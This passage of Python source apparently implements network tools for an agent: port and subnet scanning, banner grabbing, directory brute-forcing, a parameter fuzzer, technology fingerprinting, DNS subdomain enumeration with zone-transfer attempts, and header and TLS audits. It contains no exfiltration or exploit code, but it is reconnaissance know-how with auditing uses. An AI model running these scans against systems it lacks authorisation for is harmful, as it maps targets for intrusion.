            opener = urllib.request.build_opener()
            if not follow:
                opener = urllib.request.build_opener(
                    urllib.request.HTTPRedirectHandler.__new__(
                        type("NoRedirect", (urllib.request.HTTPRedirectHandler,), {
                            "redirect_request": lambda self, req, fp, code, msg, hdrs, newurl: None
                        })
                    )
                )
            t0 = time.monotonic()
            try:
                with opener.open(req, timeout=timeout, context=ctx) if not follow else \
                     urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                    elapsed = round((time.monotonic() - t0) * 1000, 2)
                    raw = resp.read(max_bytes)
                    truncated = len(raw) >= max_bytes
                    return {
                        "status": resp.status,
                        "reason": resp.reason,
                        "headers": dict(resp.headers),
                        "body": _decode(raw),
                        "truncated": truncated,
                        "url": resp.url,
                        "elapsed_ms": elapsed,
                        "success": True,
                    }
            except urllib.error.HTTPError as e:
                elapsed = round((time.monotonic() - t0) * 1000, 2)
                try:
                    raw = e.read(max_bytes)
                except Exception:
                    raw = b""
                return {
                    "status": e.code,
                    "reason": e.reason,
                    "headers": dict(e.headers) if hasattr(e, "headers") else {},
                    "body": _decode(raw),
                    "elapsed_ms": elapsed,
                    "success": False,
                }
            except Exception as e:
                return {"error": str(e), "url": url, "success": False}

        return await loop.run_in_executor(None, do_request)

    async def _interfaces(self, args: dict) -> dict:
        addrs = psutil.net_if_addrs()
        stats = psutil.net_if_stats()
        io = psutil.net_io_counters(pernic=True)
        ifaces = []
        for name, addr_list in addrs.items():
            st = stats.get(name)
            io_c = io.get(name)
            ips = [
                {"family": a.family.name, "address": a.address, "netmask": a.netmask}
                for a in addr_list
            ]
            ifaces.append({
                "name": name,
                "is_up": st.isup if st else None,
                "speed_mbps": st.speed if st else None,
                "mtu": st.mtu if st else None,
                "addresses": ips,
                "bytes_sent_mb": round(io_c.bytes_sent / 1048576, 2) if io_c else None,
                "bytes_recv_mb": round(io_c.bytes_recv / 1048576, 2) if io_c else None,
            })
        ifaces.sort(key=lambda x: (not x["is_up"], x["name"]))
        return {"interfaces": ifaces, "count": len(ifaces)}

    async def _traceroute(self, args: dict) -> dict:
        host = args["host"]
        max_hops = args.get("max_hops", 20)
        timeout = args.get("timeout", 45)
        cmd = (
            ["tracert", "-h", str(max_hops), "-w", "1000", host]
            if IS_WIN
            else ["traceroute", "-m", str(max_hops), "-w", "2", host]
        )
        loop = asyncio.get_event_loop()
        ok, output = await loop.run_in_executor(
            None, lambda: _run_subprocess(cmd, timeout)
        )
        hops = _parse_traceroute_output(output, IS_WIN)
        return {"host": host, "hops": hops, "hop_count": len(hops), "raw_output": output, "success": ok}

    async def _port_scan(self, args: dict) -> dict:
        host = args["host"]
        timeout = args.get("timeout", 1.0)
        concurrency = min(args.get("concurrency", 300), 1000)
        grab_banners = args.get("grab_banners", False)

        ports: list[int] = []
        if "port_range" in args and args["port_range"]:
            start, end = args["port_range"][0], args["port_range"][1]
            ports = list(range(start, end + 1))
        if "ports" in args and args["ports"]:
            ports = list(set(ports + args["ports"]))
        if not ports:
            return {"error": "Provide 'ports' list or 'port_range' [start, end]"}

        ports.sort()
        sem = asyncio.Semaphore(concurrency)
        t0 = time.monotonic()

        async def grab_banner(host: str, port: int) -> str | None:
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port), timeout=timeout + 1
                )
                try:
                    data = await asyncio.wait_for(reader.read(1024), timeout=2)
                    writer.close()
                    return _decode(data).strip()[:256]
                except asyncio.TimeoutError:
                    probe_map = {
                        80: b"HEAD / HTTP/1.0\r\n\r\n",
                        443: b"HEAD / HTTP/1.0\r\n\r\n",
                        8080: b"HEAD / HTTP/1.0\r\n\r\n",
                        21: b"",
                        22: b"",
                        25: b"EHLO test\r\n",
                    }
                    probe = probe_map.get(port)
                    if probe:
                        writer.write(probe)
                        await writer.drain()
                        data = await asyncio.wait_for(reader.read(1024), timeout=2)
                        writer.close()
                        return _decode(data).strip()[:256]
                    writer.close()
                    return None
            except Exception:
                return None

        async def check(port: int) -> dict:
            async with sem:
                try:
                    _, writer = await asyncio.wait_for(
                        asyncio.open_connection(host, port), timeout=timeout
                    )
                    writer.close()
                    try:
                        await writer.wait_closed()
                    except Exception:
                        pass
                    service = COMMON_SERVICE_PORTS.get(port, "unknown")
                    result = {"port": port, "open": True, "service": service}
                    if grab_banners:
                        result["banner"] = await grab_banner(host, port)
                    return result
                except Exception:
                    return {"port": port, "open": False}

        results = await asyncio.gather(*[check(p) for p in ports])
        elapsed = round(time.monotonic() - t0, 2)
        open_ports = [r for r in results if r["open"]]

        return {
            "host": host,
            "scanned": len(ports),
            "open_count": len(open_ports),
            "open_ports": open_ports,
            "elapsed_sec": elapsed,
        }

    async def _whois(self, args: dict) -> dict:
        target = args["target"]
        loop = asyncio.get_event_loop()

        def do_whois():
            is_ip = False
            try:
                ipaddress.ip_address(target)
                is_ip = True
            except ValueError:
                pass

            if is_ip:
                server = _get_whois_server_for_ip(target)
            else:
                tld = target.rsplit(".", 1)[-1].lower() if "." in target else ""
                server = WHOIS_SERVERS.get(tld, "whois.iana.org")

            def query_server(srv: str, query: str) -> str:
                with socket.create_connection((srv, 43), timeout=10) as s:
                    s.sendall((query + "\r\n").encode())
                    resp = b""
                    while True:
                        chunk = s.recv(4096)
                        if not chunk:
                            break
                        resp += chunk
                    return _decode(resp)

            try:
                text = query_server(server, target)
                if server == "whois.iana.org":
                    refer = None
                    for line in text.splitlines():
                        if line.lower().startswith("refer:"):
                            refer = line.split(":", 1)[1].strip()
                            break
                    if refer:
                        text2 = query_server(refer, target)
                        return {"target": target, "server": refer, "output": text2}
                return {"target": target, "server": server, "output": text}
            except Exception as e:
                return {"target": target, "error": str(e)}

        return await loop.run_in_executor(None, do_whois)

    async def _ssl_info(self, args: dict) -> dict:
        host = args["host"]
        port = args.get("port", 443)
        timeout = args.get("timeout", 10)
        loop = asyncio.get_event_loop()

        def get_cert():
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            try:
                with socket.create_connection((host, port), timeout=timeout) as raw_sock:
                    with ctx.wrap_socket(raw_sock, server_hostname=host) as tls_sock:
                        cert_bin = tls_sock.getpeercert(binary_form=True)
                        cert = tls_sock.getpeercert()
                        protocol = tls_sock.version()
                        cipher = tls_sock.cipher()

                sha256_fp = hashlib.sha256(cert_bin).hexdigest()
                sha256_fp = ":".join(sha256_fp[i:i+2].upper() for i in range(0, len(sha256_fp), 2))

                subject = dict(x[0] for x in cert.get("subject", []))
                issuer = dict(x[0] for x in cert.get("issuer", []))
                not_before = cert.get("notBefore", "")
                not_after = cert.get("notAfter", "")
                sans = []
                for san_type, san_value in cert.get("subjectAltName", []):
                    sans.append(f"{san_type}:{san_value}")

                serial_raw = cert.get("serialNumber", "")

                is_self_signed = subject.get("commonName") == issuer.get("commonName") and \
                    subject.get("organizationName") == issuer.get("organizationName")

                from datetime import datetime
                is_expired = False
                days_remaining = None
                try:
                    expiry = datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
                    days_remaining = (expiry - datetime.utcnow()).days
                    is_expired = days_remaining < 0
                except Exception:
                    pass

                weak_cipher = cipher and cipher[2] < 128
                weak_protocol = protocol in ("SSLv2", "SSLv3", "TLSv1", "TLSv1.1")

                issues = []
                if is_expired:
                    issues.append("EXPIRED")
                if is_self_signed:
                    issues.append("SELF_SIGNED")
                if weak_cipher:
                    issues.append(f"WEAK_CIPHER:{cipher[0]}")
                if weak_protocol:
                    issues.append(f"WEAK_PROTOCOL:{protocol}")
                if days_remaining is not None and 0 <= days_remaining <= 30:
                    issues.append(f"EXPIRING_SOON:{days_remaining}d")

                return {
                    "host": host,
                    "port": port,
                    "subject": subject,
                    "issuer": issuer,
                    "sans": sans,
                    "not_before": not_before,
                    "not_after": not_after,
                    "days_remaining": days_remaining,
                    "serial": serial_raw,
                    "fingerprint_sha256": sha256_fp,
                    "protocol": protocol,
                    "cipher": cipher[0] if cipher else None,
                    "cipher_bits": cipher[2] if cipher else None,
                    "is_self_signed": is_self_signed,
                    "is_expired": is_expired,
                    "issues": issues,
                    "success": True,
                }
            except Exception as e:
                return {"host": host, "port": port, "error": str(e), "success": False}

        return await loop.run_in_executor(None, get_cert)

    async def _banner_grab(self, args: dict) -> dict:
        host = args["host"]
        port = args["port"]
        probe = args.get("probe", "")
        timeout = float(args.get("timeout", 5))
        read_bytes = args.get("read_bytes", 1024)

        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=timeout
            )
            if probe:
                writer.write(probe.encode() if isinstance(probe, str) else probe)
                await writer.drain()

            try:
                data = await asyncio.wait_for(reader.read(read_bytes), timeout=timeout)
            except asyncio.TimeoutError:
                data = b""
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass

            banner_text = _decode(data).strip()
            service_hint = COMMON_SERVICE_PORTS.get(port, "unknown")

            return {
                "host": host,
                "port": port,
                "banner": banner_text,
                "banner_hex": data.hex()[:128],
                "bytes_received": len(data),
                "service_hint": service_hint,
                "success": True,
            }
        except asyncio.TimeoutError:
            return {"host": host, "port": port, "error": "Connection timed out", "success": False}
        except ConnectionRefusedError:
            return {"host": host, "port": port, "error": "Connection refused", "success": False}
        except Exception as e:
            return {"host": host, "port": port, "error": str(e), "success": False}

    async def _http_headers_audit(self, args: dict) -> dict:
        url = args["url"]
        timeout = args.get("timeout", 10)

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        loop = asyncio.get_event_loop()

        def fetch():
            req = urllib.request.Request(url, method="GET")
            req.add_header("User-Agent", "Mozilla/5.0 (compatible; SecurityAudit/1.0)")
            try:
                with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                    return dict(resp.headers), resp.status
            except urllib.error.HTTPError as e:
                return dict(e.headers) if hasattr(e, "headers") else {}, e.code
            except Exception as e:
                return None, str(e)

        headers, status = await loop.run_in_executor(None, fetch)
        if headers is None:
            return {"url": url, "error": str(status), "success": False}

        hdrs_lower = {k.lower(): v for k, v in headers.items()}

        def check(name, present_ok, absent_warn, value_checks=None):
            val = hdrs_lower.get(name.lower())
            if val is None:
                return {"header": name, "status": "MISSING", "value": None, "detail": absent_warn}
            if value_checks:
                for condition, detail, severity in value_checks:
                    if condition(val):
                        return {"header": name, "status": severity, "value": val, "detail": detail}
            return {"header": name, "status": "OK", "value": val, "detail": present_ok}

        findings = []

        findings.append(check(
            "Strict-Transport-Security",
            "HSTS present",
            "Missing HSTS — enables downgrade attacks",
            [
                (lambda v: "max-age" not in v.lower(), "HSTS missing max-age", "WARN"),
                (lambda v: int(re.search(r"max-age=(\d+)", v, re.I).group(1)) < 31536000
                 if re.search(r"max-age=(\d+)", v, re.I) else False,
                 "HSTS max-age under 1 year", "WARN"),
            ]
        ))
        findings.append(check(
            "Content-Security-Policy",
            "CSP present",
            "Missing CSP — XSS risk",
            [
                (lambda v: "unsafe-inline" in v, "CSP contains unsafe-inline", "WARN"),
                (lambda v: "unsafe-eval" in v, "CSP contains unsafe-eval", "WARN"),
                (lambda v: "*" in v and "default-src" in v, "CSP default-src wildcard", "WARN"),
            ]
        ))
        findings.append(check(
            "X-Frame-Options",
            "Clickjacking protection present",
            "Missing X-Frame-Options — clickjacking risk",
            [
                (lambda v: v.upper() not in ("DENY", "SAMEORIGIN"),
                 "X-Frame-Options value should be DENY or SAMEORIGIN", "WARN"),
            ]
        ))
        findings.append(check(
            "X-Content-Type-Options",
            "MIME sniffing protection present",
            "Missing X-Content-Type-Options — MIME sniffing risk",
            [
                (lambda v: v.lower() != "nosniff", "Value should be 'nosniff'", "WARN"),
            ]
        ))
        findings.append(check(
            "Referrer-Policy",
            "Referrer-Policy present",
            "Missing Referrer-Policy — may leak sensitive URLs",
        ))
        findings.append(check(
            "Permissions-Policy",
            "Permissions-Policy present",
            "Missing Permissions-Policy",
        ))

        server = hdrs_lower.get("server", "")
        if server:
            version_pattern = re.search(r"[\d./]", server)
            if version_pattern:
                findings.append({
                    "header": "Server",
                    "status": "INFO",
                    "value": server,
                    "detail": "Server header discloses version info — consider removing"
                })
            else:
                findings.append({"header": "Server", "status": "OK", "value": server, "detail": "No version disclosed"})

        x_powered = hdrs_lower.get("x-powered-by")
        if x_powered:
            findings.append({
                "header": "X-Powered-By",
                "status": "INFO",
                "value": x_powered,
                "detail": "X-Powered-By discloses technology — consider removing"
            })

        cors_origin = hdrs_lower.get("access-control-allow-origin")
        if cors_origin == "*":
            findings.append({
                "header": "Access-Control-Allow-Origin",
                "status": "WARN",
                "value": cors_origin,
                "detail": "CORS wildcard — any origin can read responses"
            })
        elif cors_origin:
            findings.append({
                "header": "Access-Control-Allow-Origin",
                "status": "OK",
                "value": cors_origin,
                "detail": "CORS restricted to specific origin"
            })

        set_cookie = hdrs_lower.get("set-cookie", "")
        if set_cookie:
            cookie_issues = []
            if "httponly" not in set_cookie.lower():
                cookie_issues.append("missing HttpOnly")
            if "secure" not in set_cookie.lower():
                cookie_issues.append("missing Secure")
            if "samesite" not in set_cookie.lower():
                cookie_issues.append("missing SameSite")
            if cookie_issues:
                findings.append({
                    "header": "Set-Cookie",
                    "status": "WARN",
                    "value": set_cookie[:120],
                    "detail": f"Cookie flags missing: {', '.join(cookie_issues)}"
                })
            else:
                findings.append({"header": "Set-Cookie", "status": "OK", "value": set_cookie[:120], "detail": "Cookie flags OK"})

        summary = {
            "OK": sum(1 for f in findings if f["status"] == "OK"),
            "WARN": sum(1 for f in findings if f["status"] == "WARN"),
            "MISSING": sum(1 for f in findings if f["status"] == "MISSING"),
            "INFO": sum(1 for f in findings if f["status"] == "INFO"),
        }

        return {
            "url": url,
            "http_status": status,
            "findings": findings,
            "summary": summary,
            "success": True,
        }

    async def _http_dir_scan(self, args: dict) -> dict:
        base_url = args["base_url"].rstrip("/")
        wordlist_name = args.get("wordlist", "common")
        timeout = float(args.get("timeout", 5))
        concurrency = min(args.get("concurrency", 20), 50)
        filter_codes = set(args.get("filter_codes") or [200, 201, 204, 301, 302, 403, 500])

        paths = COMMON_PATHS.get(wordlist_name, COMMON_PATHS["common"])
        if wordlist_name == "extended":
            paths = COMMON_PATHS["common"] + COMMON_PATHS["api"]

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        sem = asyncio.Semaphore(concurrency)
        loop = asyncio.get_event_loop()
        t0 = time.monotonic()
        found = []

        def fetch_path(path: str) -> dict | None:
            url = base_url + path
            req = urllib.request.Request(url, method="HEAD")
            req.add_header("User-Agent", "Mozilla/5.0 (compatible; DirScanner/1.0)")
            try:
                with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                    if resp.status in filter_codes:
                        return {"path": path, "status": resp.status, "url": url,
                                "content_length": resp.headers.get("Content-Length")}
            except urllib.error.HTTPError as e:
                if e.code in filter_codes:
                    return {"path": path, "status": e.code, "url": url, "content_length": None}
            except Exception:
                pass
            return None

        async def check_path(path: str):
            async with sem:
                return await loop.run_in_executor(None, lambda: fetch_path(path))

        results = await asyncio.gather(*[check_path(p) for p in paths])
        found = [r for r in results if r is not None]
        found.sort(key=lambda x: x["status"])

        return {
            "base_url": base_url,
            "checked": len(paths),
            "found": len(found),
            "elapsed_sec": round(time.monotonic() - t0, 2),
            "results": found,
        }

    async def _subnet_scan(self, args: dict) -> dict:
        cidr = args["cidr"]
        timeout = float(args.get("timeout", 0.5))
        concurrency = min(args.get("concurrency", 254), 500)
        scan_ports = args.get("scan_ports") or [22, 80, 443, 445, 3389, 8080]

        try:
            network = ipaddress.ip_network(cidr, strict=False)
        except ValueError as e:
            return {"error": f"Invalid CIDR: {e}"}

        hosts = list(network.hosts())
        if len(hosts) > 1024:
            return {"error": f"Network too large ({len(hosts)} hosts). Max 1024. Use a smaller subnet."}

        sem = asyncio.Semaphore(concurrency)
        t0 = time.monotonic()

        async def probe_host(ip: str) -> dict | None:
            async with sem:
                open_ports = []
                for port in scan_ports:
                    try:
                        _, writer = await asyncio.wait_for(
                            asyncio.open_connection(ip, port), timeout=timeout
                        )
                        writer.close()
                        try:
                            await writer.wait_closed()
                        except Exception:
                            pass
                        service = COMMON_SERVICE_PORTS.get(port, "unknown")
                        open_ports.append({"port": port, "service": service})
                    except Exception:
                        pass
                if open_ports:
                    return {"ip": ip, "open_ports": open_ports, "alive": True}
                return None

        results = await asyncio.gather(*[probe_host(str(h)) for h in hosts])
        alive = [r for r in results if r is not None]
        alive.sort(key=lambda x: list(map(int, x["ip"].split("."))))

        return {
            "cidr": cidr,
            "total_hosts": len(hosts),
            "alive_count": len(alive),
            "elapsed_sec": round(time.monotonic() - t0, 2),
            "hosts": alive,
        }

    async def _fuzzer(self, args: dict) -> dict:
        url = args["url"]
        method = args.get("method", "GET").upper()
        parameter = args.get("parameter")
        header_name = args.get("header")
        payload_set = args.get("payload_set", "generic")
        custom_payloads = args.get("custom_payloads")
        timeout = float(args.get("timeout", 8))
        baseline_value = args.get("baseline_param_value", "test")

        if not parameter and not header_name:
            return {"error": "Provide 'parameter' or 'header' to fuzz"}

        payloads = custom_payloads if custom_payloads else FUZZER_PAYLOADS.get(payload_set, FUZZER_PAYLOADS["generic"])

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        loop = asyncio.get_event_loop()

        def make_request(payload: str) -> dict:
            target_url = url
            headers = {"User-Agent": "Mozilla/5.0 (compatible; Fuzzer/1.0)"}
            body_data = None

            if header_name:
                headers[header_name] = payload
            elif parameter:
                if method == "GET":
                    parsed = urllib.parse.urlparse(url)
                    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                    params[parameter] = [payload]
                    new_query = urllib.parse.urlencode(params, doseq=True)
                    target_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
                elif method == "POST":
                    body_data = urllib.parse.urlencode({parameter: payload}).encode()
                    headers["Content-Type"] = "application/x-www-form-urlencoded"

            req = urllib.request.Request(target_url, data=body_data, headers=headers, method=method)
            t0 = time.monotonic()
            try:
                with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                    raw = resp.read(8192)
                    elapsed = round((time.monotonic() - t0) * 1000, 2)
                    return {
                        "payload": payload,
                        "status": resp.status,
                        "length": len(raw),
                        "elapsed_ms": elapsed,
                        "error": None,
                    }
            except urllib.error.HTTPError as e:
                elapsed = round((time.monotonic() - t0) * 1000, 2)
                try:
                    raw = e.read(8192)
                    length = len(raw)
                except Exception:
                    length = 0
                return {
                    "payload": payload,
                    "status": e.code,
                    "length": length,
                    "elapsed_ms": elapsed,
                    "error": None,
                }
            except Exception as e:
                elapsed = round((time.monotonic() - t0) * 1000, 2)
                return {"payload": payload, "status": None, "length": 0, "elapsed_ms": elapsed, "error": str(e)}

        baseline = await loop.run_in_executor(None, lambda: make_request(baseline_value))

        sem = asyncio.Semaphore(10)

        async def fuzz_one(payload: str) -> dict:
            async with sem:
                return await loop.run_in_executor(None, lambda: make_request(payload))

        results = await asyncio.gather(*[fuzz_one(p) for p in payloads])

        anomalies = []
        for r in results:
            if r["payload"] == baseline_value:
                continue
            status_diff = r["status"] != baseline["status"]
            length_diff = abs((r["length"] or 0) - (baseline["length"] or 0)) > 50
            time_diff = (r["elapsed_ms"] or 0) > (baseline["elapsed_ms"] or 0) + 2000
            if status_diff or length_diff or time_diff or r["error"]:
                r["anomaly_reasons"] = []
                if status_diff:
                    r["anomaly_reasons"].append(f"status:{baseline['status']}->{r['status']}")
                if length_diff:
                    r["anomaly_reasons"].append(f"length:{baseline['length']}->{r['length']}")
                if time_diff:
                    r["anomaly_reasons"].append(f"slow_response:{r['elapsed_ms']}ms")
                if r["error"]:
                    r["anomaly_reasons"].append(f"error:{r['error']}")
                anomalies.append(r)

        return {
            "url": url,
            "parameter": parameter,
            "header": header_name,
            "payload_set": payload_set,
            "total_payloads": len(payloads),
            "baseline": baseline,
            "anomaly_count": len(anomalies),
            "anomalies": anomalies,
        }

    async def _tech_fingerprint(self, args: dict) -> dict:
        url = args["url"]
        timeout = args.get("timeout", 10)

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        loop = asyncio.get_event_loop()

        def fetch():
            req = urllib.request.Request(url)
            req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            try:
                with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                    body = _decode(resp.read(65536))
                    return dict(resp.headers), body, resp.status
            except urllib.error.HTTPError as e:
                try:
                    body = _decode(e.read(65536))
                except Exception:
                    body = ""
                return dict(e.headers) if hasattr(e, "headers") else {}, body, e.code
            except Exception as e:
                return None, None, str(e)

        headers, body, status = await loop.run_in_executor(None, fetch)
        if headers is None:
            return {"url": url, "error": str(status), "success": False}

        hdrs = {k.lower(): v for k, v in headers.items()}
        body_lower = (body or "").lower()
        detected = {}

        server = hdrs.get("server", "")
        if server:
            for sig, name in [("nginx", "Nginx"), ("apache", "Apache"), ("iis", "IIS"),
                               ("lighttpd", "Lighttpd"), ("caddy", "Caddy"),
                               ("cloudflare", "Cloudflare"), ("openresty", "OpenResty")]:
                if sig in server.lower():
                    detected["web_server"] = name
                    break

        x_powered = hdrs.get("x-powered-by", "")
        if x_powered:
            for sig, name in [("php", "PHP"), ("asp.net", "ASP.NET"), ("express", "Express.js"),
                               ("next.js", "Next.js"), ("django", "Django")]:
                if sig in x_powered.lower():
                    detected["runtime"] = name
                    break

        waf_headers = {
            "x-sucuri-id": "Sucuri WAF",
            "x-sucuri-cache": "Sucuri WAF",
            "x-fw-hash": "Fortiweb WAF",
            "x-akamai-transformed": "Akamai",
            "x-cache": "CDN/Cache",
            "x-cdn": "CDN",
            "cf-ray": "Cloudflare",
            "x-amz-cf-id": "AWS CloudFront",
            "x-azure-ref": "Azure CDN",
            "x-fastly-request-id": "Fastly CDN",
        }
        for hdr, tech in waf_headers.items():
            if hdr in hdrs:
                detected.setdefault("cdn_waf", [])
                if tech not in detected["cdn_waf"]:
                    detected["cdn_waf"].append(tech)

        cms_signatures = [
            ("wp-content", "WordPress"), ("wp-includes", "WordPress"),
            ("drupal.js", "Drupal"), ("/sites/default/", "Drupal"),
            ("joomla", "Joomla"), ("/components/com_", "Joomla"),
            ("magento", "Magento"), ("/skin/frontend/", "Magento"),
            ("shopify", "Shopify"), ("cdn.shopify.com", "Shopify"),
            ("squarespace", "Squarespace"), ("wix.com", "Wix"),
            ("typo3", "TYPO3"), ("contao", "Contao"),
            ("ghost.io", "Ghost"), ("webflow", "Webflow"),
        ]
        for sig, name in cms_signatures:
            if sig in body_lower:
                detected["cms"] = name
                break

        framework_signatures = [
            ("react", "React"), ("angular", "Angular"), ("vue.js", "Vue.js"),
            ("ember.js", "Ember.js"), ("backbone.js", "Backbone.js"),
            ("jquery", "jQuery"), ("bootstrap", "Bootstrap"),
            ("tailwindcss", "Tailwind CSS"), ("next.js", "Next.js"),
            ("nuxt", "Nuxt.js"), ("gatsby", "Gatsby"),
            ("laravel", "Laravel"), ("symfony", "Symfony"),
            ("rails", "Ruby on Rails"), ("django", "Django"),
            ("flask", "Flask"), ("spring", "Spring"),
            ("struts", "Apache Struts"),
        ]
        js_libs = []
        for sig, name in framework_signatures:
            if sig in body_lower:
                js_libs.append(name)
        if js_libs:
            detected["js_frameworks"] = list(dict.fromkeys(js_libs))

        analytics = []
        for sig, name in [
            ("google-analytics.com", "Google Analytics"),
            ("googletagmanager.com", "Google Tag Manager"),
            ("hotjar.com", "Hotjar"),
            ("segment.com", "Segment"),
            ("mixpanel.com", "Mixpanel"),
            ("amplitude.com", "Amplitude"),
            ("intercom.io", "Intercom"),
            ("hubspot.com", "HubSpot"),
        ]:
            if sig in body_lower:
                analytics.append(name)
        if analytics:
            detected["analytics"] = analytics

        db_hints = []
        for sig, name in [
            ("mysql", "MySQL"), ("postgresql", "PostgreSQL"),
            ("mongodb", "MongoDB"), ("redis", "Redis"),
            ("oracle", "Oracle DB"), ("mssql", "MSSQL"),
        ]:
            if sig in body_lower:
                db_hints.append(name)
        if db_hints:
            detected["db_hints"] = db_hints

        return {
            "url": url,
            "http_status": status,
            "detected": detected,
            "raw_server": server,
            "raw_x_powered_by": x_powered,
            "success": True,
        }

    async def _dns_zone_enum(self, args: dict) -> dict:
        domain = args["domain"].lower().strip()
        wordlist_name = args.get("wordlist", "small")
        dns_server = args.get("dns_server", "8.8.8.8")
        concurrency = min(args.get("concurrency", 50), 200)
        timeout = float(args.get("timeout", 2))
        check_axfr = args.get("check_zone_transfer", True)
        check_email = args.get("check_email_security", True)

        wordlist = SUBDOMAIN_WORDLIST_SMALL if wordlist_name == "small" else SUBDOMAIN_WORDLIST_MEDIUM
        loop = asyncio.get_event_loop()
        sem = asyncio.Semaphore(concurrency)
        t0 = time.monotonic()

        wildcard_ips = set()
        wild = await loop.run_in_executor(
            None, lambda: _dns_query_raw(f"wildcard-test-xyzxyz.{domain}", 1, dns_server, timeout)
        )
        if wild:
            wildcard_ips = set(wild)

        async def probe_sub(sub: str) -> dict | None:
            async with sem:
                fqdn = f"{sub}.{domain}"
                ips = await loop.run_in_executor(
                    None, lambda: _dns_query_raw(fqdn, 1, dns_server, timeout)
                )
                if ips and not set(ips).issubset(wildcard_ips):
                    return {"subdomain": fqdn, "ips": ips}
                cnames = await loop.run_in_executor(
                    None, lambda: _dns_query_raw(fqdn, 5, dns_server, timeout)
                )
                if cnames:
                    return {"subdomain": fqdn, "cnames": cnames}
                return None

        sub_results = await asyncio.gather(*[probe_sub(s) for s in wordlist])
        found_subs = [r for r in sub_results if r is not None]

        axfr_result = None
        if check_axfr:
            ns_records = await loop.run_in_executor(
                None, lambda: _dns_query_raw(domain, 2, dns_server, timeout)
            )
            for ns in (ns_records or []):
                try:
                    ns_ip = (await loop.run_in_executor(
                        None, lambda n=ns: _dns_query_raw(n, 1, dns_server, timeout)
                    ) or [None])[0]
                    if ns_ip:
                        axfr_data = await loop.run_in_executor(
                            None, lambda ip=ns_ip: _dns_query_tcp(domain, 252, ip, 5)
                        )
                        if axfr_data:
                            axfr_result = {"ns": ns, "data": axfr_data}
                            break
                except Exception:
                    pass

        email_security = {}
        if check_email:
            spf = await loop.run_in_executor(
                None, lambda: _dns_query_raw(domain, 16, dns_server, timeout)
            )
            spf_records = [r for r in (spf or []) if "v=spf1" in r.lower()]
            email_security["spf"] = spf_records or None

            dmarc = await loop.run_in_executor(
                None, lambda: _dns_query_raw(f"_dmarc.{domain}", 16, dns_server, timeout)
            )
            dmarc_records = [r for r in (dmarc or []) if "v=dmarc1" in r.lower()]
            email_security["dmarc"] = dmarc_records or None

            dkim_selectors = ["default", "google", "k1", "mail", "dkim", "selector1", "selector2"]
            dkim_found = []
            for sel in dkim_selectors:
                rec = await loop.run_in_executor(
                    None, lambda s=sel: _dns_query_raw(f"{s}._domainkey.{domain}", 16, dns_server, timeout)
                )
                if rec:
                    dkim_found.append({"selector": sel, "record": rec[0][:100]})
            email_security["dkim_selectors_found"] = dkim_found or None

            if not spf_records:
                email_security["spf_issue"] = "No SPF record — spoofing possible"
            elif spf_records and "+all" in spf_records[0]:
                email_security["spf_issue"] = "SPF allows all (+all) — effectively no restriction"
            if not dmarc_records:
                email_security["dmarc_issue"] = "No DMARC record — no email authentication policy"

        return {
            "domain": domain,
            "dns_server": dns_server,
            "wildcard_detected": bool(wildcard_ips),
            "wildcard_ips": list(wildcard_ips),
            "subdomains_found": len(found_subs),
            "subdomains": found_subs,
            "zone_transfer": axfr_result,
            "zone_transfer_vulnerable": axfr_result is not None,
            "email_security": email_security if check_email else None,
            "elapsed_sec": round(time.monotonic() - t0, 2),
        }

    def get_handlers(self):
        return {
            "net_connections": self._connections,
            "net_ping": self._ping,
            "net_dns_lookup": self._dns_lookup,
            "net_http_request": self._http_request,
            "net_interfaces": self._interfaces,
            "net_traceroute": self._traceroute,
            "net_port_scan": self._port_scan,
            "net_whois": self._whois,
            "net_ssl_info": self._ssl_info,
            "net_banner_grab": self._banner_grab,
            "net_http_headers_audit": self._http_headers_audit,
            "net_http_dir_scan": self._http_dir_scan,
            "net_subnet_scan": self._subnet_scan,
            "net_fuzzer": self._fuzzer,
            "net_tech_fingerprint": self._tech_fingerprint,
            "net_dns_zone_enum": self._dns_zone_enum,
        }